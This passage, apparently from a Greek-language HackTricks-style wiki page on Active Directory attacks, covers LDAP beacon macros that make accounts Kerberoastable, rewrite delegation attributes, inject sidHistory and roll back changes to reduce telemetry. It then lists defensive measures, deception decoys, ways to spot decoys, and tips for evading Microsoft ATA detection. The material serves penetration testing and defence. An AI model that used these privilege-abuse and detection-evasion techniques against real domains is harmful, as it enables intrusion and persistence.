- `add-spn`/`set-spn` κάνουν άμεσα έναν συμβιβασμένο χρήστη Kerberoastable· `add-asreproastable` (UAC toggle) τον σημαδεύει για AS-REP roasting χωρίς να αγγίζει το password.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) επαναγράφουν `msDS-AllowedToDelegateTo`, UAC flags, ή `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, επιτρέποντας constrained/unconstrained/RBCD attack paths και εξαλείφοντας την ανάγκη για remote PowerShell ή RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` εγχέει privileged SIDs στο SID history ενός ελεγχόμενου principal (see [SID-History Injection](sid-history-injection.md)), παρέχοντας stealthy access inheritance πλήρως μέσω LDAP/LDAPS.
- `move-object` αλλάζει το DN/OU των computers ή users, επιτρέποντας σε έναν επιτιθέμενο να μεταφέρει πόρους σε OUs όπου υπάρχουν ήδη delegated rights πριν εκμεταλλευτεί `set-password`, `add-groupmember`, ή `add-spn`.
- Εντολές αφαίρεσης με στενό scope (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, κ.λπ.) επιτρέπουν γρήγορο rollback μετά τη συγκομιδή credentials ή persistence, ελαχιστοποιώντας την telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Ορισμένες Γενικές Άμυνες

[**Μάθετε περισσότερα για το πώς να προστατεύετε διαπιστευτήρια εδώ.**](../stealing-credentials/credentials-protections.md)

### **Μέτρα Άμυνας για την Προστασία Διαπιστευτηρίων**

- **Domain Admins Restrictions**: Συνιστάται οι Domain Admins να επιτρέπεται να κάνουν login μόνο σε Domain Controllers, αποφεύγοντας τη χρήση τους σε άλλους hosts.
- **Service Account Privileges**: Οι υπηρεσίες δεν θα πρέπει να τρέχουν με Domain Admin (DA) privileges για τη διατήρηση της ασφάλειας.
- **Temporal Privilege Limitation**: Για εργασίες που απαιτούν DA privileges, η διάρκεια τους πρέπει να περιορίζεται. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 και στη συνέχεια επιβάλετε LDAP signing καθώς και LDAPS channel binding σε DCs/clients για να μπλοκάρετε LDAP MITM/relay προσπάθειες.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Εφαρμογή Deception Τεχνικών**

- Η εφαρμογή deception περιλαμβάνει τη δημιουργία παγίδων, όπως decoy users ή computers, με χαρακτηριστικά όπως passwords που δεν λήγουν ή είναι σημασμένα ως Trusted for Delegation. Μια λεπτομερής προσέγγιση περιλαμβάνει τη δημιουργία χρηστών με συγκεκριμένα rights ή την προσθήκη τους σε ομάδες υψηλών προνομίων.
- Ένα πρακτικό παράδειγμα περιλαμβάνει τη χρήση εργαλείων όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερα για την ανάπτυξη deception techniques μπορείτε να βρείτε στο [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Ανίχνευση Deception**

- **Για User Objects**: Ύποπτοι δείκτες περιλαμβάνουν μη τυπικό ObjectSID, σπάνιες συνδέσεις, ημερομηνίες δημιουργίας και χαμηλό πλήθος bad password attempts.
- **Γενικοί Δείκτες**: Η σύγκριση attributes πιθανών decoy objects με εκείνα των γνήσιων μπορεί να αποκαλύψει ασυνέπειες. Εργαλεία όπως [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στην ταυτοποίηση τέτοιων deceptions.

### **Παράκαμψη Συστημάτων Ανίχνευσης**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Αποφυγή session enumeration σε Domain Controllers για να αποτραπεί ανίχνευση από ATA.
- **Ticket Impersonation**: Η χρήση **aes** keys για δημιουργία ticket βοηθά στην αποφυγή ανίχνευσης αποφεύγοντας την υποβάθμιση σε NTLM.
- **DCSync Attacks**: Συνιστάται εκτέλεση από μη Domain Controller για να αποφευχθεί ανίχνευση ATA, καθώς η άμεση εκτέλεση από Domain Controller θα προκαλέσει alerts.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
